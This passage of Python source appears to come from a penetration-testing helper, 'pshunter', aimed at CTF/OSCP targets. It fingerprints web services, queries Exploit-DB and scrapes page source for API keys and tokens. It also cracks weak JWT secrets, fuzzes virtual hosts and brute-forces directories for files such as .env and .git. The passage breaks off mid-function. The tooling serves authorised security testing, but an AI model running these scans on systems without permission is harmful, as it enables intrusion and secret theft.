    triaged.sort(key=lambda t: (t[0], t[1]))
    return [(port, proto, label, key, ver, signal)
            for _rank, port, proto, label, key, ver, signal in triaged]


def _service_steps_complete(ip: str, port: int, proto: str, key: str) -> bool:
    """True when every checklist step for this service is resolved (done or skip) — the
    condition for turning the service (and, when all are, phase 6) green."""
    steps = _EXPLOIT_STEPS.get(key) or _EXPLOIT_STEPS["other"]
    status = fetch_step_status(ip, port, proto, key)
    return bool(steps) and all(status.get(i) in ("done", "skip")
                               for i in range(1, len(steps) + 1))


def _render_exploit_targets(ip: str) -> list:
    """Numbered, priority-ordered list of the host's services worth attacking (best
    CTF/OSCP candidates first). A service whose whole checklist is resolved shows green.
    Returns the ordered targets so a number can pick one."""
    print(f"\n{BOLD}{ip} — service exploitation{RESET}")
    if not fetch_ports(ip):
        print(f"  {DIM}no open ports recorded — run {BOLD}[1] Port enumeration{RESET}"
              f"{DIM} first{RESET}")
        return []
    targets = _exploit_targets(ip)
    rows = []
    for i, (port, proto, label, key, ver, signal) in enumerate(targets, 1):
        # '?' flags a label not confirmed by a -sV version/CPE fingerprint (a service-name
        # or port guess), so it's clear which rows to verify before trusting them.
        name = label + ("?" if signal in ("service", "port") else "")
        disp = f"{GREEN}{name}{RESET}" if _service_steps_complete(ip, port, proto, key) else name
        rows.append([str(i), disp, f"{port}/{proto}", _cell(ver or "—", 30), f"via {signal}"])
    print(_box_table(["#", "SERVICE", "PORT", "VERSION", "SIGNAL"], rows,
                     aligns=["r", "l", "l", "l", "l"]))
    hostnames = fetch_hostnames(ip)
    if hostnames:
        names = ", ".join(hn for hn, _p, _s in hostnames)
        print(f"  {DIM}hostnames (→ /etc/hosts, vhost-fuzz): {RESET}{CYAN}{names}{RESET}")
    return targets


def _step_parts(step) -> tuple:
    """Normalise a checklist entry to (description, tool_key). A plain string has no
    tool; a (description, tool_key) tuple points at a runner in _STEP_TOOLS."""
    if isinstance(step, tuple):
        return step[0], step[1]
    return step, None


def _tool_http_headers(ip: str, port: int, proto: str) -> str:
    """HTTP step-1 tool: grab a web server's response headers (Server, X-Powered-By,
    cookies) + status, WITHOUT following redirects so a 30x Location (often a vhost) is
    captured. Stdlib only — no external dependency; one focused header grab is enough for
    this step (deeper fingerprinting is step 2 / whatweb)."""
    import urllib.request
    import ssl

    class _NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):       # keep the 30x so we see Location
            return None

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    url = f"{'https' if tls else 'http'}://{ip}:{port}/"
    ctx = ssl._create_unverified_context()
    opener = urllib.request.build_opener(_NoRedirect, urllib.request.HTTPSHandler(context=ctx))
    req = urllib.request.Request(url, headers={"User-Agent": "pshunter"})
    try:
        resp = opener.open(req, timeout=8)
        status, headers = resp.status, resp.headers
    except urllib.error.HTTPError as exc:          # 30x / 4xx / 5xx still carry useful headers
        status, headers = exc.code, exc.headers
    # a connection-level failure (refused / timeout / DNS) propagates → the step won't go green
    lines = [f"{url} → HTTP {status}"]
    lines += [f"{k}: {v}" for k, v in headers.items()]
    return "\n".join(lines)


def _tool_http_fingerprint(ip: str, port: int, proto: str) -> str:
    """HTTP step-2 tool: fingerprint the web stack with whatweb (server, framework, CMS,
    plugins, versions) — deeper than step 1's raw headers. External binary; a missing
    whatweb or a dead target raises, so the step won't turn green on a non-result."""
    exe = shutil.which("whatweb")
    if not exe:
        raise RuntimeError("whatweb not found in PATH — install it or run this step manually")
    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    url = f"{'https' if tls else 'http'}://{ip}:{port}/"
    proc = subprocess.run([exe, "--color=never", "--no-errors", "-a", "1", url],
                          capture_output=True, text=True, timeout=90)
    out = (proc.stdout or "").strip() or (proc.stderr or "").strip()
    if not out:
        raise RuntimeError("whatweb returned no output (target unreachable?)")
    return out


def _tool_tls_cert(ip: str, port: int, proto: str) -> str:
    """HTTP step-3 tool: grab the TLS certificate with openssl and dump its text (subject,
    issuer, SAN). Saved under the 'ssl-cert' id so _extract_hostnames auto-harvests SAN DNS
    names into the hostnames table (→ /etc/hosts / vhost-fuzz); emails land in findings.
    Non-TLS ports raise, so the step won't turn green on a non-result."""
    exe = shutil.which("openssl")
    if not exe:
        raise RuntimeError("openssl not found in PATH — run this step manually")
    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    if not tls:
        raise RuntimeError(f"no TLS on {ip}:{port} — step 3 targets HTTPS/TLS services")
    cmd = [exe, "s_client", "-connect", f"{ip}:{port}"]
    hn = next((h for h, _p, _s in fetch_hostnames(ip)), None)   # SNI → per-vhost cert if we have a name
    if hn:
        cmd += ["-servername", hn]
    s = subprocess.run(cmd, input="", capture_output=True, text=True, timeout=20)
    if "BEGIN CERTIFICATE" not in s.stdout:
        raise RuntimeError("no certificate returned (handshake failed?)")
    x = subprocess.run([exe, "x509", "-noout", "-text"], input=s.stdout,
                       capture_output=True, text=True, timeout=15)
    out = (x.stdout or "").strip()
    if not out:
        raise RuntimeError("could not parse certificate")
    return out


_SPLOIT_INTERESTING = {   # whatweb plugin names worth an Exploit-DB lookup (when versioned)
    "apache", "nginx", "microsoft-iis", "litespeed", "openresty", "tomcat", "jetty",
    "php", "wordpress", "drupal", "joomla", "magento", "mediawiki", "typo3", "moodle",
    "jenkins", "jira", "gitlab", "phpmyadmin", "openssl", "openssh",
}


def _exploit_search_terms(ip: str, port: int, proto: str) -> list:
    """(product, version) pairs to feed searchsploit: nmap -sV product+version plus the
    whatweb CMS/framework tokens from step 2. Only pairs with a real version number (x.y[.z])
    — bare products are skipped because they'd flood searchsploit."""
    terms, seen = [], set()

    def _add(product: str, version: str) -> None:
        product, version = (product or "").strip(), (version or "").strip()
        if not product or not re.match(r"\d+(\.\d+)+", version):   # need major.minor at least
            return
        product = product.split()[0].lower()          # "Apache httpd" -> "apache"
        version = re.match(r"[0-9.]+", version).group(0)   # "2.4.29 (Ubuntu)" -> "2.4.29"
        if (product, version) not in seen:
            seen.add((product, version))
            terms.append((product, version))

    _name, prod, ver, _cpe = (fetch_services(ip).get((port, proto)) or ("", "", "", ""))
    _add(prod, ver)                                    # 1) nmap -sV
    for sid, out in fetch_scripts(ip, port, proto):    # 2) whatweb fingerprint tokens
        if sid != "http-fingerprint":
            continue
        for pname, pval in re.findall(r"([A-Za-z0-9_.-]+)\[([^\]]*)\]", out or ""):
            if pname.lower() in _SPLOIT_INTERESTING:
                _add(pname, pval)
    return terms


def _tool_searchsploit(ip: str, port: int, proto: str) -> str:
    """HTTP step-4 tool: query the local Exploit-DB for the versions found in steps 1-2 with
    searchsploit --strict --title (version-range fuzzing off → far fewer false positives).
    Candidates only — verify before use; CMS matches can still hit plugin versions."""
    exe = shutil.which("searchsploit")
    if not exe:
        raise RuntimeError("searchsploit not found in PATH — install exploitdb or run manually")
    terms = _exploit_search_terms(ip, port, proto)
    if not terms:
        raise RuntimeError("no product+version known yet — run steps 1-2 first")
    searched = "; ".join(f"{p} {v}" for p, v in terms)
    seen, hits = set(), []
    for product, version in terms:
        proc = subprocess.run([exe, "-j", "-s", "-t", product, version],
                              capture_output=True, text=True, timeout=30)
        try:
            rows = json.loads(proc.stdout or "{}").get("RESULTS_EXPLOIT", [])
        except ValueError:
            rows = []
        for r in rows:
            edb = str(r.get("EDB-ID", "?"))
            if edb in seen:
                continue
            seen.add(edb)
            hits.append((f"{product} {version}", (r.get("Title") or "").strip(), edb,
                         r.get("Path", "")))
            if len(hits) >= 10:                        # cap: keep it a shortlist, not a dump
                break
        if len(hits) >= 10:
            break
    if not hits:
        return f"searched: {searched}\n\nno Exploit-DB matches (strict/version)"
    lines = [f"searched: {searched}", ""]
    for term, title, edb, path in hits:
        lines.append(f"[{term}] {title}  (EDB-{edb})")
        if path:
            lines.append(f"    {path}")
    return "\n".join(lines)


_SECRET_PATTERNS = [   # conservative set — fixed-format keys first, then noisier assignments
    ("aws-key",     r"AKIA[0-9A-Z]{16}"),
    ("google-api",  r"AIza[0-9A-Za-z_\-]{35}"),
    ("slack-token", r"xox[baprs]-[0-9A-Za-z-]{10,}"),
    ("jwt",         r"eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}"),
    ("bearer",      r"[Aa]uthorization[\"']?\s*[:=]\s*[\"']?Bearer\s+[A-Za-z0-9._\-]+"),
    ("private-key", r"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----"),
    ("assignment",  r"(?i)(?:api[_-]?key|secret|token|password|passwd|pwd)"
                    r"[\"']?\s*[:=]\s*[\"'][^\"']{6,60}[\"']"),
]


def _tool_http_source(ip: str, port: int, proto: str) -> str:
    """HTTP step-5 tool: fetch the landing page + its same-host JS (depth 0-1) and mine HTML
    comments, endpoints / API routes and likely secrets (keys, tokens). Stdlib only; a dead
    target raises so the step won't go green. Secrets are candidates — verify (esp. assignment)."""
    import urllib.request
    import urllib.error
    import urllib.parse
    import ssl

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    base = f"{'https' if tls else 'http'}://{ip}:{port}"
    ctx = ssl._create_unverified_context()
    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))

    def _get(url: str, limit: int = 512_000) -> str:
        req = urllib.request.Request(url, headers={"User-Agent": "pshunter"})
        try:
            with opener.open(req, timeout=8) as r:            # default opener follows redirects
                return r.read(limit).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:                   # 4xx/5xx bodies still worth mining
            return e.read(limit).decode("utf-8", "replace") if e.fp else ""

    html = _get(base + "/")
    if not html:
        raise RuntimeError(f"no HTML from {base}/ (unreachable?)")

    js_urls = []                                              # same host:port JS only, cap 10
    for src in re.findall(r"<script[^>]+src=[\"']([^\"']+)[\"']", html, re.I):
        u = urllib.parse.urljoin(base + "/", src)
        if u.startswith(base) and u not in js_urls:
            js_urls.append(u)
    js_urls = js_urls[:10]

    corpus = html
    for u in js_urls:
        corpus += "\n" + _get(u)

    comments = []
    for c in re.findall(r"<!--(.*?)-->", html, re.S):
        c = " ".join(c.split())
        if len(c) > 3 and not c.startswith("[if"):            # skip IE conditional comments
            comments.append(c[:160])

    eps = set()
    eps.update(re.findall(r"[\"'`](/[A-Za-z0-9_./?=&%-]{2,})[\"'`]", corpus))
    eps.update(re.findall(r"(?:fetch|axios(?:\.\w+)?|\.open)\(\s*[\"'`]([^\"'`]+)", corpus))
    eps.update(re.findall(r"(https?://[A-Za-z0-9_.:-]+/[A-Za-z0-9_./?=&%-]*)", corpus))
    endpoints = sorted({e for e in eps if len(e) <= 120})[:40]

    secrets, seen = [], set()
    for label, pat in _SECRET_PATTERNS:
        for mtch in re.findall(pat, corpus):
            s = (mtch if isinstance(mtch, str) else mtch[0]).strip()[:80]
            if (label, s) not in seen:
                seen.add((label, s))
                secrets.append(f"{label}: {s}")
    secrets = secrets[:15]

    lines = [f"{base}/ → {len(html)} bytes HTML, {len(js_urls)} JS file(s)"]
    if js_urls:
        lines.append(f"\nJS FILES ({len(js_urls)}):")
        lines += [f"  {u}" for u in js_urls]
    if endpoints:
        lines.append(f"\nENDPOINTS ({len(endpoints)}):")
        lines += [f"  {e}" for e in endpoints]
    if comments:
        lines.append(f"\nHTML COMMENTS ({len(comments)}):")
        lines += [f"  {c}" for c in comments[:25]]
    if secrets:
        lines.append(f"\nPOTENTIAL SECRETS ({len(secrets)}):")
        lines += [f"  {s}" for s in secrets]
    return "\n".join(lines)


_ERROR_TECH = [   # framework signatures that leak from an error/404 page body
    ("Werkzeug/Flask", r"Werkzeug|Traceback \(most recent call last\)"),
    ("Django",         r"Django|You're seeing this error because"),
    ("Laravel/Symfony", r"Laravel|Symfony|Whoops"),
    ("ASP.NET",        r"ASP\.NET|Server Error in .*? Application"),
    ("Java/Tomcat",    r"Apache Tomcat|javax\.servlet|java\.lang\."),
    ("Express",        r"Cannot (?:GET|POST) /|X-Powered-By: Express"),
    ("Rails",          r"Ruby on Rails|Action Controller"),
    ("PHP",            r"Fatal error:|Warning:.*?on line|<b>Notice</b>"),
]


def _tool_http_wellknown(ip: str, port: int, proto: str) -> str:
    """HTTP step-6 tool: fetch a fixed set of well-known files (robots.txt, sitemap.xml,
    .well-known, an error page) and pull out hidden paths + tech leaks. Stdlib only; a dead
    target raises. Not a brute-force — a known, finite set of locations (dir-brute is step 8)."""
    import urllib.request
    import urllib.error
    import ssl

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    base = f"{'https' if tls else 'http'}://{ip}:{port}"
    ctx = ssl._create_unverified_context()
    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))

    def _get(path: str, limit: int = 256_000):
        req = urllib.request.Request(base + path, headers={"User-Agent": "pshunter"})
        try:
            with opener.open(req, timeout=8) as r:
                return r.status, r.read(limit).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, (e.read(limit).decode("utf-8", "replace") if e.fp else "")
        except Exception:                                     # connection-level failure
            return None, ""

    robots_status, robots = _get("/robots.txt")
    err_status, err = _get("/pshunter-probe-404-xyz")         # error page for a tech leak
    if robots_status is None and err_status is None:
        raise RuntimeError(f"{base} unreachable")

    robots_paths = []
    if robots_status == 200:
        for p in re.findall(r"(?im)^(?:Disallow|Allow):\s*(\S+)", robots):
            if p not in robots_paths:
                robots_paths.append(p)

    sitemap_urls = []
    for sm in ("/sitemap.xml", "/sitemap_index.xml"):
        st, body = _get(sm)
        if st == 200:
            for loc in re.findall(r"<loc>\s*([^<\s]+)\s*</loc>", body, re.I):
                if loc not in sitemap_urls:
                    sitemap_urls.append(loc)
    sitemap_urls = sitemap_urls[:100]

    wellknown = []
    for wk in ("/.well-known/security.txt", "/crossdomain.xml", "/clientaccesspolicy.xml"):
        st, body = _get(wk)
        if st == 200 and body.strip():
            wellknown.append((wk, body.strip()[:400]))

    tech = [label for label, pat in _ERROR_TECH if re.search(pat, err, re.I | re.S)]

    lines = [f"{base} — well-known probe (robots {robots_status}, error {err_status})"]
    if robots_paths:
        lines.append(f"\nROBOTS PATHS ({len(robots_paths)}):")
        lines += [f"  {p}" for p in robots_paths[:50]]
    if sitemap_urls:
        lines.append(f"\nSITEMAP URLS ({len(sitemap_urls)}):")
        lines += [f"  {u}" for u in sitemap_urls]
    if wellknown:
        lines.append(f"\nWELL-KNOWN ({len(wellknown)}):")
        for path, body in wellknown:
            lines.append(f"  {path}:")
            lines += [f"    {ln.rstrip()}" for ln in body.splitlines()[:8]]
    if tech:
        lines.append(f"\nERROR-PAGE TECH: {', '.join(tech)}")
    return "\n".join(lines)


_JWT_WEAK_SECRETS = [   # small curated list — a trivial-secret check, not a full crack (hashcat)
    "secret", "password", "changeme", "admin", "jwt", "key", "private", "your-256-bit-secret",
    "your_jwt_secret", "supersecret", "s3cr3t", "secretkey", "secret123", "password123",
    "12345678", "qwerty", "test", "dev", "default", "token", "mysecret", "jwtsecret",
    "jsonwebtoken", "shhhh", "topsecret", "letmein", "root", "pass", "hmac", "signature",
    "verysecret", "sign", "secretpassword", "iloveyou", "abc123", "welcome", "ChangeMe!",
]


def _jwt_analyze(token: str):
    """(header, payload, note) for a JWT, or None if it isn't one. `note` flags alg:none or a
    cracked weak HS256 secret."""
    import base64
    import json
    import hmac
    import hashlib

    parts = token.split(".")
    if len(parts) != 3 or not token.startswith("eyJ"):
        return None

    def _seg(s):
        return json.loads(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)).decode("utf-8", "replace"))

    try:
        header, payload = _seg(parts[0]), _seg(parts[1])
    except Exception:
        return None
    alg, note = str(header.get("alg", "?")), None
    if alg.lower() == "none":
        note = "alg:none → auth bypass"
    elif alg.upper() == "HS256":
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        for sec in _JWT_WEAK_SECRETS:
            sig = base64.urlsafe_b64encode(
                hmac.new(sec.encode(), signing_input, hashlib.sha256).digest()).rstrip(b"=").decode()
            if hmac.compare_digest(sig, parts[2]):
                note = f"weak HS256 secret: '{sec}'"
                break
    return header, payload, note


def _tool_http_cookies(ip: str, port: int, proto: str) -> str:
    """HTTP step-7 tool: read Set-Cookie flags, flag predictable session IDs, and decode any
    JWT (alg:none / weak HS256 secret). Stdlib only; a dead target raises. No cookies is a
    valid green result (nothing to report)."""
    import urllib.request
    import urllib.error
    import ssl

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    base = f"{'https' if tls else 'http'}://{ip}:{port}"
    ctx = ssl._create_unverified_context()
    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
    req = urllib.request.Request(base + "/", headers={"User-Agent": "pshunter"})
    try:
        resp = opener.open(req, timeout=8)
        headers = resp.headers
    except urllib.error.HTTPError as e:                        # 4xx/5xx still carry Set-Cookie
        headers = e.headers

    raw = headers.get_all("Set-Cookie") or []
    cookie_lines, jwt_lines = [], []
    for sc in raw:
        cname, _, cval = sc.split(";")[0].partition("=")
        cname, cval = cname.strip(), cval.strip()
        attrs = sc.lower()
        missing = [f for f, tok in (("HttpOnly", "httponly"), ("Secure", "secure"),
                                    ("SameSite", "samesite"))
                   if tok not in attrs and not (f == "Secure" and not tls)]
        line = f"{cname}: " + (f"missing {','.join(missing)}" if missing else "flags ok")
        if re.search(r"sess|sid|token|auth|jwt|id$", cname, re.I) and \
                (len(cval) < 8 or cval.isdigit() or len(set(cval)) <= 4):
            line += " · looks predictable"
        cookie_lines.append(line)
        info = _jwt_analyze(cval)
        if info:
            hdr, payload, note = info
            claims = {k: payload[k] for k in ("sub", "role", "user", "name", "exp") if k in payload}
            jwt_lines.append(f"{cname}: alg={hdr.get('alg')} {claims}" + (f"  ⚠ {note}" if note else ""))

    lines = [f"{base}/ — {len(raw)} Set-Cookie header(s)"]
    if cookie_lines:
        lines.append("\nCOOKIES:")
        lines += [f"  {c}" for c in cookie_lines]
    if jwt_lines:
        lines.append("\nJWT:")
        lines += [f"  {j}" for j in jwt_lines]
    if not cookie_lines:
        lines.append("\nno cookies set (pre-auth)")
    return "\n".join(lines)


# vhost/subdomain wordlists, best first — the runner uses the first that exists on disk,
# else a small builtin fallback so the tool always has something to sweep.
_VHOST_WORDLISTS = [
    ("seclists top-20000",     "/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"),
    ("seclists top-5000",      "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"),
    ("seclists bitquark-100k", "/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt"),
    ("seclists n0kovo-small",  "/usr/share/seclists/Discovery/DNS/n0kovo_subdomains/n0kovo_subdomains_small.txt"),
    ("amass top-20000",        "/usr/share/wordlists/amass/subdomains-top1mil-20000.txt"),
    ("amass top-5000",         "/usr/share/wordlists/amass/subdomains-top1mil-5000.txt"),
    ("dnsmap",                 "/usr/share/wordlists/dnsmap.txt"),
]
_VHOST_BUILTIN = [   # ultimate fallback: common internal / CTF vhost labels
    "www", "dev", "development", "staging", "stage", "test", "testing", "uat", "qa",
    "admin", "administrator", "api", "api-dev", "internal", "intranet", "corp", "portal",
    "dashboard", "app", "apps", "web", "webmail", "mail", "smtp", "vpn", "git", "gitlab",
    "jenkins", "jira", "confluence", "grafana", "kibana", "prometheus", "db", "database",
    "phpmyadmin", "backup", "old", "beta", "demo", "static", "cdn", "files", "upload",
    "storage", "auth", "sso", "login", "secure", "monitor", "status", "support",
]
_VHOST_DEADLINE = 600         # s — hard wall-clock cap across every pass
_VHOST_THREADS = 30
_VHOST_REQ_TIMEOUT = 5
_VHOST_MAX_CANDIDATES = 25000  # sanity cap on words per pass


def _pick_vhost_wordlist() -> tuple:
    """Return (label, words) from the best available wordlist, or a builtin fallback.
    `label` names the source (with its path) so it can be shown at launch."""
    for label, path in _VHOST_WORDLISTS:
        if os.path.exists(path):
            try:
                with open(path, encoding="utf-8", errors="ignore") as fh:
                    words = [w.strip() for w in fh if w.strip() and not w.startswith("#")]
            except OSError:
                continue
            if words:
                return f"{label} ({path})", words
    return f"builtin ({len(_VHOST_BUILTIN)} common vhosts)", list(_VHOST_BUILTIN)


def _vhost_base_domains(ip: str) -> list:
    """Base domains to fuzz as FUZZ.<domain>, derived from hostnames already harvested
    (cert SAN/CN, redirects, JS). Heuristic registrable domain = last 2–3 labels."""
    doms = set()
    for hn, _p, _s in fetch_hostnames(ip):
        hn = (hn or "").lstrip("*.").strip(".")
        parts = hn.split(".")
        if len(parts) >= 2:
            doms.add(".".join(parts[-2:]))
        if len(parts) >= 3:
            doms.add(".".join(parts[-3:]))
    return sorted(doms)


def _tool_vhost_fuzz(ip: str, port: int, proto: str) -> str:
    """HTTP step-8 tool: sweep virtual hosts on THIS IP by spoofing the Host header, keeping
    only responses that differ from a per-pass catch-all baseline (kills wildcard vhosts).
    Runs one pass per harvested base domain (FUZZ.<domain>) plus a bare-label pass, all under
    a shared wall-clock deadline. Discovered FQDN vhosts are saved to the hostnames table
    incrementally (the moment each is found), so a long run never loses progress."""
    import http.client
    import ssl
    import time
    import random
    import string
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _probe(hostval):
        """(status, body-length) for a GET / with a spoofed Host, or (None, None) on error."""
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_VHOST_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_VHOST_REQ_TIMEOUT)
            conn.request("GET", "/", headers={"Host": hostval, "User-Agent": "pshunter"})
            resp = conn.getresponse()
            body = resp.read(65536)
            return resp.status, len(body)
        except Exception:                                     # noqa: BLE001 — one dead probe never aborts the sweep
            return None, None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    # fail fast if the web server itself is unreachable (so the step won't go green on nothing)
    if _probe(ip)[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot vhost-fuzz")

    wl_label, words = _pick_vhost_wordlist()
    words = words[:_VHOST_MAX_CANDIDATES]
    domains = _vhost_base_domains(ip)

    # passes: one per base domain (FUZZ.domain), then a bare-label pass last (lower priority)
    passes = [(f"FUZZ.{d}", (lambda w, d=d: f"{w}.{d}")) for d in domains]
    passes.append(("FUZZ (bare label)", (lambda w: w)))

    deadline = time.time() + _VHOST_DEADLINE
    hits, seen = [], set()
    hits_lock = threading.Lock()
    tested = [0]
    tested_lock = threading.Lock()
    stopped_deadline = [False]

    def _diff(status, length, b_status, b_len):
        if status is None:
            return False
        if b_status is None:                                  # junk host got nothing → any live vhost counts
            return True
        if status != b_status:
            return True
        return abs(length - b_len) > max(200, int(b_len * 0.05))

    pass_summaries = []
    for pass_label, hostfmt in passes:
        if time.time() >= deadline:
            stopped_deadline[0] = True
            break
        rnd = "zz" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
        b_status, b_len = _probe(hostfmt(rnd))               # per-pass catch-all baseline
        q = _queue.Queue()
        for w in words:
            q.put(w)

        def _worker():
            while True:
                if time.time() >= deadline:
                    stopped_deadline[0] = True
                    return
                try:
                    w = q.get_nowait()
                except _queue.Empty:
                    return
                hostval = hostfmt(w)
                status, length = _probe(hostval)
                with tested_lock:
                    tested[0] += 1
                if _diff(status, length, b_status, b_len):
                    with hits_lock:
                        if hostval not in seen:
                            seen.add(hostval)
                            hits.append(f"+ {hostval}  → HTTP {status}  ({length} b)")
                            # persist FQDN vhosts live so a long run never loses progress
                            save_hostnames(ip, [{"port": port, "hostname": hostval,
                                                 "source": "vhost-fuzz"}])

        threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_VHOST_THREADS)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        base_desc = f"HTTP {b_status} ({b_len} b)" if b_status is not None else "no response"
        pass_summaries.append(f"  {pass_label}: baseline {base_desc}")

    reason = "deadline" if stopped_deadline[0] else "wordlist exhausted"
    lines = [f"{scheme}://{ip}:{port}/ vhost sweep",
             f"wordlist: {wl_label}",
             f"passes: {len(passes)} ({', '.join(pl for pl, _ in passes)})",
             f"tested {tested[0]} · hits {len(hits)} · stopped: {reason}",
             ""]
    lines += pass_summaries
    if hits:
        lines.append("\nVHOSTS:")
        lines += [f"  {h}" for h in sorted(hits)]
    else:
        lines.append("\nno differentiated vhosts found")
    return "\n".join(lines)


# directory/file wordlists for content discovery, best first — each entry may list several
# files (merged if present); the runner uses the first entry that has any file on disk.
_DIRB_WORDLISTS = [
    ("seclists raft-medium", ["/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
                              "/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt"]),
    ("seclists dirlist-2.3-medium", ["/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"]),
    ("seclists common", ["/usr/share/seclists/Discovery/Web-Content/common.txt"]),
    ("dirb common", ["/usr/share/wordlists/dirb/common.txt"]),
    ("dirb big", ["/usr/share/wordlists/dirb/big.txt"]),
    ("dirbuster small", ["/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"]),
]
_DIRB_BUILTIN = [   # ultimate fallback: common dirs / files worth a look
    "admin", "administrator", "login", "dashboard", "api", "uploads", "upload", "images",
    "assets", "static", "backup", "backups", "config", "includes", "inc", "tmp", "test",
    "dev", "old", "private", "secret", "data", "db", "sql", "logs", "log", "wp-admin",
    "wp-content", "phpmyadmin", "server-status", "robots.txt", "sitemap.xml", ".git",
    ".env", ".htaccess", "web.config", "config.php", "info.php", "phpinfo.php", "index.php",
]
_DIRB_EXTS = ["php", "asp", "aspx", "txt", "bak", "zip", "html", "old"]
_DIRB_DEADLINE = 900          # s — hard wall-clock cap across all targets
_DIRB_THREADS = 30
_DIRB_REQ_TIMEOUT = 5
_DIRB_MAX_WORDS = 20000       # sanity cap on words per target
_DIRB_SENSITIVE = re.compile(
    r"\.(bak|zip|old|sql|tar|gz|tgz|env|git|svn|conf|config|pem|key)\b"
    r"|/(backup|admin|config|\.git|\.env|\.svn)", re.I)


def _pick_dirb_wordlist() -> tuple:
    """Return (label, words) from the best available dir/file wordlist, or a builtin
    fallback. Multi-file entries are merged (dedup, order-preserving)."""
    for label, paths in _DIRB_WORDLISTS:
        merged, seen = [], set()
        for path in paths:
            if not os.path.exists(path):
                continue
            try:
                with open(path, encoding="utf-8", errors="ignore") as fh:
                    for ln in fh:
                        w = ln.strip()
                        if w and not w.startswith("#") and w not in seen:
                            seen.add(w)
                            merged.append(w)
            except OSError:
                continue
        if merged:
            return f"{label} ({', '.join(paths)})", merged
    return f"builtin ({len(_DIRB_BUILTIN)} common paths)", list(_DIRB_BUILTIN)


def _tool_dir_brute(ip: str, port: int, proto: str) -> str:
    """HTTP step-9 tool: content discovery — brute-force dirs/files on the default host AND
    every discovered vhost (Host header, so vhosts work without /etc/hosts). Per target a
    soft-404 baseline filters catch-all 200s; only responses that differ are reported. All
    targets share one wall-clock deadline. Stdlib only; a dead server raises."""
    import http.client
    import ssl
    import time
    import random
    import string
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _probe(hostval, path):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_DIRB_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_DIRB_REQ_TIMEOUT)
            conn.request("GET", path, headers={"Host": hostval, "User-Agent": "pshunter"})
            resp = conn.getresponse()
            body = resp.read(65536)
            return resp.status, len(body)
        except Exception:                                     # noqa: BLE001
            return None, None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _probe(ip, "/")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot content-sweep")

    wl_label, words = _pick_dirb_wordlist()
    words = words[:_DIRB_MAX_WORDS]

    def _paths_for(word):
        w = word.lstrip("/")
        if not w:
            return []
        out = ["/" + w]
        if "." not in w:                                      # plain dir/name → try extensions too
            out += [f"/{w}.{e}" for e in _DIRB_EXTS]
        return out

    vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
    targets = [ip] + [v for v in vhosts if v != ip]          # default host first, then each vhost

    deadline = time.time() + _DIRB_DEADLINE
    tested = [0]
    tested_lock = threading.Lock()
    stopped_deadline = [False]
    target_hits = {}                                          # hostval -> ["+ 200  /path", ...]

    def _rnd_path():
        return "/zz" + "".join(random.choices(string.ascii_lowercase + string.digits, k=12)) \
               + random.choice(["", ".php"])

    def _is_hit(status, length, baselines):
        if status is None or status == 404:
            return False
        for bs, bl in baselines:
            if bs is not None and status == bs and abs(length - bl) <= max(200, int(bl * 0.05)):
                return False                                  # matches the soft-404 signature
        return True

    for hostval in targets:
        if time.time() >= deadline:
            stopped_deadline[0] = True
            break
        baselines = [_probe(hostval, _rnd_path()) for _ in range(2)]
        q = _queue.Queue()
        for w in words:
            for p in _paths_for(w):
                q.put(p)
        hits, seen = [], set()
        hits_lock = threading.Lock()

        def _worker():
            while True:
                if time.time() >= deadline:
                    stopped_deadline[0] = True
                    return
                try:
